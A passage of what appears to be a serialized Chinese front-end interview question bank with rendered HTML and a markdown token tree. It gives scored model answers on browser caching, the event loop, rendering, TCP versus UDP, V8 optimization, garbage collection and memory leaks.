协商缓存<ul>\\n<li>如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。</li>\\n<li>设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>什么情况会阻塞渲染</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。</p>\\n</li>\\n<li><p><strong>4：</strong></p>\\n<ul>\\n<li>当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。</li>\\n<li>如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。</li>\\n<li>script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。</li>\\n<li>对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>浏览器的事件机制</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li>浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。</li>\\n</ul>\\n<p>事件的传播过程分为三个阶段：捕获阶段、目标阶段和冒泡阶段。在DOM2级事件模型中，事件首先在最外层HTML元素上开始捕获，然后向下传递到事件的目标元素，沿途触发所有设置了捕获事件处理器的元素。接着，事件处理器在事件的目标元素上执行，这是事件处理的核心阶段。最后，事件从目标元素向上回溯，触发所有设置了冒泡事件处理器的元素，完成冒泡阶段。这种机制允许开发者在事件传播的不同阶段拦截并处理事件。</p>\\n<p>常见的事件类型包括鼠标事件（如click、mouseover、mousedown等）、键盘事件（如keydown、keyup、keypress等）以及表单事件（如submit、input、change等）。这些事件为开发者提供了丰富的交互能力，可以响应用户的各种操作并相应地更新页面内容。</p>\\n<p>在事件处理过程中，浏览器还维护一个事件队列。一旦事件队列中的事件得到处理，它就会被移除。此外，浏览器还支持宏任务和微任务的概念，用于管理异步执行的任务。例如，setTimeout、setInterval等是常见的宏任务，而Promise的回调则是微任务。这些任务的执行顺序和优先级也是事件机制的一部分。</p>\\n<h2>浏览器的事件循环和node的事件循环区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p>浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。</p>\\n<p>首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。</p>\\n<p>其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。</p>\\n<p>另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。</p>\\n</li>\\n</ul>\\n<h2>进程和线程的区别?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p>. 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。</p>\\n</li>\\n<li><p>. 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。</p>\\n</li>\\n<li><p>进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。</p>\\n</li>\\n<li><p>由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。</p>\\n</li>\\n</ul>\\n<h2>什么是重绘和回流及怎么减少重绘和回流？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。</p>\\n</li>\\n<li><p>回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。</p>\\n</li>\\n</ul>\\n<h2>tcp和udp的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。</p>\\n</li>\\n<li><p>CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。</p>\\n</li>\\n<li><p>由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。</p>\\n</li>\\n<li><p>TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。</p>\\n</li>\\n<li><p>TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。</p>\\n</li>\\n</ul>\\n<h2>浏览器 Eventloop</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>1：</strong> 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题</p>\\n</li>\\n<li><p><strong>1：</strong> JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为</p>\\n</li>\\n<li><p><strong>1：</strong> 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 <code>不得⼩于 4 毫秒</code>，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\">console.log(&#39;script start&#39;);\\n\\nsetTimeout(function(){\\n    console.log(&#39;setTimeout&#39;);\\n},0);\\n\\nconsole.log(&#39;script end&#39;);\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task</li>\\n</ul>\\n<pre><code class=\\"language-js\\">console.log(&#39;script start&#39;);\\n\\nsetTimeout(function () {\\n    console.log(&#39;setTimeout&#39;);\\n}, 0);\\n\\nnew Promise((resolve) =&gt; {\\n    console.log(&#39;Promise&#39;)\\n    resolve()\\n}).then(function () {\\n    console.log(&#39;promise1&#39;);\\n}).then(function () {\\n    console.log(&#39;promise2&#39;);\\n});\\n\\nconsole.log(&#39;script end&#39;);\\n\\n// 结果\\n// script start =&gt; Promise =&gt; script end =&gt; promise1 =&gt; promise2 =&gt; setTime\\n</code></pre>\\n<ul>\\n<li><p><strong>1：</strong> 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver</p>\\n</li>\\n<li><p><strong>1：</strong> 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin</p>\\n</li>\\n</ul>\\n<p>注：很多⼈有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script，浏览器会先执⾏⼀个宏任务，接下来有异步代码的话就先执⾏微任务</p>\\n<ul>\\n<li><p><strong>1：</strong> 正确的⼀次 Event loop 顺序是这样的：</p>\\n<p>  执⾏同步代码，这属于宏任务</p>\\n<p>  执⾏栈为空，查询是否有微任务需要执⾏</p>\\n<p>  执⾏所有微任务</p>\\n<p>  必要的话渲染 UI</p>\\n<p>  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码</p>\\n</li>\\n</ul>\\n<p>注：如果宏任务中的异步代码有⼤量的计算并且需要操作 DOM 的话，为了更快的界⾯响应，我们可以把操作 DOM 放⼊微任务中</p>\\n</details>\\n\\n<h2>浏览器中常见的存储方式有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。</li>\\n<li><strong>1：</strong> LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。</li>\\n<li><strong>1：</strong> SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。</li>\\n<li><strong>1：</strong> IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。</li>\\n</ul>\\n<h2>常见的浏览器内核有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]</li>\\n<li><strong>1：</strong>  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等</li>\\n<li><strong>1：</strong>  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]</li>\\n<li><strong>1：</strong>  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]</li>\\n</ul>\\n<h2>V8 引擎如何进行代码优化？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（12 分）</h4>\\n<ul>\\n<li>V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：<ul>\\n<li>解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化</li>\\n<li>热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。</li>\\n<li>优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率</li>\\n<li>逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配</li>\\n<li>内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问</li>\\n<li>代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式</li>\\n</ul>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# 浏览器原理篇\\n\\n","depth":1,"text":"浏览器原理篇","tokens":[{"type":"text","raw":"浏览器原理篇","text":"浏览器原理篇","escaped":false}]},{"type":"heading","raw":"## 浏览器垃圾回收机制 - V8的垃圾回收机制是怎样的\\n\\n","depth":2,"text":"浏览器垃圾回收机制 - V8的垃圾回收机制是怎样的","tokens":[{"type":"text","raw":"浏览器垃圾回收机制 - V8的垃圾回收机制是怎样的","text":"浏览器垃圾回收机制 - V8的垃圾回收机制是怎样的","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。\\n- **1：**（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。\\n- **1：**（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。\\n","task":false,"loose":false,"text":"**1：** V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。","tokens":[{"type":"text","raw":"**1：** V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。","text":"**1：** V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。","text":" V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。\\n","task":false,"loose":false,"text":"**1：**（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。","tokens":[{"type":"text","raw":"**1：**（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。","text":"**1：**（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。","text":"（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","task":false,"loose":false,"text":"**1：**（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","tokens":[{"type":"text","raw":"**1：**（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","text":"**1：**（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","text":"（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 哪些操作会造成内存泄漏？\\n\\n","depth":2,"text":"哪些操作会造成内存泄漏？","tokens":[{"type":"text","raw":"哪些操作会造成内存泄漏？","text":"哪些操作会造成内存泄漏？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。\\n- **1：** 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。\\n- **1：** 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。\\n- **1：** 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。\\n","task":false,"loose":false,"text":"**1：** 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。","tokens":[{"type":"text","raw":"**1：** 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。","text":"**1：** 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。","text":" 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。\\n","task":false,"loose":false,"text":"**1：** 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。","tokens":[{"type":"text","raw":"**1：** 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。","text":"**1：** 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。","text":" 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。\\n","task":false,"loose":false,"text":"**1：** 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。","tokens":[{"type":"text","raw":"**1：** 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。","text":"**1：** 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。","text":" 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","task":false,"loose":false,"text":"**1：** 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","tokens":[{"type":"text","raw":"**1：** 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","text":"**1：** 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","text":" 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 浏览器的渲染过程\\n\\n","depth":2,"text":"浏览器的渲染过程","tokens":[{"type":"text","raw":"浏览器的渲染过程","text":"浏览器的渲染过程","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。\\n- **1：** 然后对 CSS 进行解析，生成 CSSOM 规则树。\\n- **1：** 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。\\n- **1：** 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。\\n- **1：** 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。\\n","task":false,"loose":false,"text":"**1：** 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。","tokens":[{"type":"text","raw":"**1：** 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。","text":"**1：** 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。","text":" 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 然后对 CSS 进行解析，生成 CSSOM 规则树。\\n","task":false,"loose":false,"text":"**1：** 然后对 CSS 进行解析，生成 CSSOM 规则树。","tokens":[{"type":"text","raw":"**1：** 然后对 CSS 进行解析，生成 CSSOM 规则树。","text":"**1：** 然后对 CSS 进行解析，生成 CSSOM 规则树。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 然后对 CSS 进行解析，生成 CSSOM 规则树。","text":" 然后对 CSS 进行解析，生成 CSSOM 规则树。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。\\n","task":false,"loose":false,"text":"**1：** 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 